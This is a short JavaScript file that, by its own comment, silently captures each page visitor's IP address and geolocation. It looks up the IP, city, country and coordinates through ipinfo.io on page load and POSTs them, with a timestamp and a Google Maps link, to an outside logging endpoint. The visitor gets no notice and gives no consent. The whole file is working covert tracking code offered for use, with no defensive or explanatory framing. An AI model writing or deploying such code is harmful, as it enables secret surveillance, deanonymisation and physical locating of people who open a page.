// geo-capture.js — Logs real IP & geolocation to backend silently
window.addEventListener("load", () => {
  // Get IP and Location from ipinfo.io
  fetch("https://ipinfo.io/json?token=5fa7bbf7e15c7e") // use your ipinfo token here
    .then(res => res.json())
    .then(ipData => {
      const ip = ipData.ip || "Unknown";
      const city = ipData.city || "Unknown";
      const country = ipData.country || "Unknown";
      const [lat, lon] = (ipData.loc || ",").split(",");
      const timestamp = new Date().toLocaleString();
      const gmapLink = `https://www.google.com/maps?q=${lat},${lon}`;

      // Prepare payload
      const data = {
        ip,
        city,
        country,
        lat,
        lon,
        timestamp,
        gmapLink
      };

      // Send to backend
      fetch("https://fake-logger.onrender.com/logger.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).catch(err => console.error("Logging failed", err));
    });
});
